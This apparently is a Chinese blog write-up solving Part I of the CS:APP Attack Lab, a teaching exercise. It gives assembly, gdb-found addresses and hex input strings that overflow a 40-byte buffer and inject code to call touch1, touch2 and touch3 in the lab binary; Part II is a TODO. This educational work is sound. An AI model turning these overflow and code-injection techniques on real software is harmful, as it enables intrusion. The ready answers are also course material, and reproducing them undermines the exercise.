---
title: 'CSAPP: Attack Lab'
date: 2017-05-06 22:38:55
tags: [CSAPP,Assembly]
toc: false
---

`Attack Lab`是`CS:APP`一书中第三个[实验](http://csapp.cs.cmu.edu/3e/attacklab.pdf)，包括`Part I`和`Part II`两部分，分别实现`Code Injection Attacks`和`Return-Oriented Programming`。`Code Injection Attacks`主要利用缓冲区溢出执行不安全的代码片段；当栈被标记为`nonexecutable`或者位置随机时，可以利用`Return-Oriented Programming`达到攻击的目的。

<!--more-->

目前的进度是完成了`Part I`，等有时间再回来完成`Part II`。

## Part I: Code Injection Attacks

### Level 1

`Level 1`利用输入字符串使当前执行的代码段跳转到预设的代码片段，不会涉及到`code injection`：当`test()`中`getbuf()`返回后，我们要改变`test()`正常的执行逻辑，不再执行下一条指令，而是让`test()`跳转至`touch1()`执行指令。 `test()`以及`touch1()`对应的代码如下所示。

```c
void test() 
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}

void touch1()
{
    vlevel = 1; / * Part of validation protocol * /
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

要实现`Level 1`中的跳转，关键是利用缓冲区溢出来修改`test()`调用`getbuf()`时栈帧中的返回地址。使用`objdump`将`ctarget`反编译，提取`getbuf()`关联的的汇编代码，如下所示。

```assembly
00000000004017a8 <getbuf>:
  4017a8:       48 83 ec 28             sub    $0x28,%rsp
  4017ac:       48 89 e7                mov    %rsp,%rdi
  4017af:       e8 8c 02 00 00          callq  401a40 <Gets>
  4017b4:       b8 01 00 00 00          mov    $0x1,%eax
  4017b9:       48 83 c4 28             add    $0x28,%rsp
  4017bd:       c3                      retq
  4017be:       90                      nop
  4017bf:       90                      nop
```

注意到`%rsp`被减小了`$0x28`即`40`字节，这意味着`getbuf()`开辟了`40`字节的缓冲区，而缓冲区以上的`4`字节则是`getbuf()`执行`ret`指令后`test()`继续执行的指令的地址。`Level 1`要做的就是利用缓冲区溢出，修改这`4`字节的值，使之等于`touch1()`的地址。根据反编译`ctarget`得到的汇编代码，`touch1()`的起始地址为`0x4017c0`，如下所示。

```assembly
00000000004017c0 <touch1>:
  4017c0:       48 83 ec 08             sub    $0x8,%rsp
  4017c4:       c7 05 0e 2d 20 00 01    movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  ...
```

综上，`Level 1`所需的输入字符串长度为`44`字节，前`40`字节用于填充缓冲区，具体的值不重要，后`4`字节等于`touch1()`的地址值`0x4017c0`，注意内存存储规则为`Little Endian`。

```markdown
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00
```

我们利用`hex2raw`将输入字符串(`level1.txt`)转化为字节码，并将字节码文件(`level1_bc.txt`)作为`ctarget`的输入，如下图所示。

![](/img/img-2017-05-06-Image 1.png)

`Level 1`通过缓冲区溢出帮助我们理解函数与函数之间跳转的原理，但是并未涉及到参数的传递，这需要通过`code injection`来实现。

### Level 2

`Level 2`的流程与`Level 1`相似：`test()`调用`getbuf()`，当`getbuf()`返回之后，开始执行`touch2()`的指令。`touch2()`有着如下的代码逻辑。

```c
void touch2(unsigned val)
{
    vlevel = 2; / * Part of validation protocol * /
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

与`Level 1`不同，`Level 2`除了需要实现指令跳转，还需要将`cookie`作为参数传递至`touch2()`。这意味着需要执行一段我们自定义的代码来实现参数的传递，这就是所谓的`code injection`。

在`Level 1`中，我们通过改写返回地址值达到跳转至`touch1()`的目的，如果我们现在也仅仅是将返回地址修改为`touch2()`的地址，那么参数传递的问题并没有解决。根据`x86-64`寄存器使用规范，`touch2()`的参数`val`存储于寄存器`%rdi`，此时`%rdi`的值并不是我们期望的`cookie`值。如果在跳转至`touch2()`执行指令之前，先跳转到某个区域执行一段代码，这段代码能够设置寄存器`%rdi`的值，然后再跳转到`touch2()`执行，就可以达到我们的目的。关键是这段代码存储于内存的哪块区域？答案是由`getbuf()`开辟的缓冲区，也就是`Level 1`中可以是任意值的`40`字节。基于以上思路，我们需要明确缓冲区的地址以及待注入的代码。

`getbuf()`调用`Gets()`函数开辟缓冲区，而`Gets()`的返回值即是缓冲区的地址，根据`x86-64`寄存器使用规范，返回值存储于寄存器`%rax`。利用`gdb`查看寄存器`%rax`的值，如下图所示，缓冲区的起始地址为`0x5561dc78`。

![](/img/img-2017-05-06-Image 2.png)

待注入的代码设置寄存器`%rdi`的值等于`cookie`值，然后跳转至`touch2()`执行指令。用汇编代码来描述，如下所示。

```assembly
mov $0x59b997fa,%rdi
pushq $0x4017ec
ret
```

将以上汇编代码进行汇编，然后进行反编译得到机器代码，如下图所示。

![](/img/img-2017-05-06-Image 3.png)

至此，可以写出`Level 2`所需的输入字符串，如下所示。

```markdown
48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55
```

利用`hex2raw`将输入字符串转化为字节码，并将字节码文件作为`ctarget`的输入，运行结果如下图所示。

![](/img/img-2017-05-06-Image 4.png)

### Level 3

`Level 3`也需要通过`code injection`来传递参数。比`Level 2`更复杂的是，`Level 3`传递的参数类型是字符串，更确切的说，应该是字符串的地址。与`Level 3`相关联的`touch3()`如下所示。

```c
void touch3(char *sval)
{
    vlevel = 3; / * Part of validation protocol * /
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

注意到`touch3()`内部调用了`hexmatch()`，其代码如下所示。同时，根据`hexmatch()`的代码逻辑我们推断出`touch3()`期待的参数为`cookie`值的字符串表示。

```c
/ * Compare string to hex represention of unsigned value * /
int hexmatch(unsigned val, char *sval)
{
    char cbuf[110];
    / * Make position of check string unpredictable * /
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}
```

与`Level 2`的思路类似，`Level 3`通过向`getbuf()`开辟的缓冲区中注入代码来达到设置参数值的目的，但是我们发现`touch3()`调用了`hexmatch()`，`hexmatch()`又调用了`strncmp()`，这就出现了问题：函数的调用会导致新的数据被`push`到栈中，这意味着栈中原有的数据会被覆盖。那么，我们传递的参数，也就是字符串，应该存储在内存的什么位置？

基于以上分析，`Level 3`中待注入的代码与`Level 2`非常类似，唯一不同的就是`Level 2`向寄存器`%rdi`存储的是`cookie`值，而`Level 3`向寄存器`%rdi`存储的是`cookie`字符串的地址值。我们借助`gdb`对比`touch3()`调用`hexmatch()`前后缓冲区的变化情况，以此定位安全的存储字符串的地址。为此，我们先通过`Level 1`中的方法进入`touch3()`，并将指令执行至`hexmatch()`前一条的指令，如下图所示。

![](/img/img-2017-05-06-Image 5.png)

接着执行`callq 0x40184c <hexmatch>`指令，对比执行前后缓冲区内容的变化，可以发现缓冲区的	前`40`个字节并没有连续的`8`个安全的字节供`cookie`字符串存储，但是从`0x5561dca0`开始的`40`个字节在`hexmatch()`调用前后并没有发生变化。因此，可以把字符串存储在缓冲区以外的这片内存区域中(我选择以`0x5561dca8`为首地址的`8`个字节)。

现在可以将已确定的字符串地址存储至寄存器`%rdi`，对应的汇编代码如下所示，获取对应机器码的方式与`Level 2`一致。

```assembly
mov $0x5561dca8,%rdi
pushq $0x4018fa
ret
```

同时，`Level 3`的输入字符串需要根据字符串的存储地址做相应的补充，由于字符串的首地址为`0x5561dca8`，且字符串长度为`8`，因此输入字符串的总长度为`56`字节，如下所示。

```markdown
48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61
```

借助`hex2raw`将输入字符串转化为字节码，并将其作为`ctarget`的输入，结果如下图所示。

![](/img/img-2017-05-06-Image 6.png)

## Part II: Return-Oriented Programming

### // TODO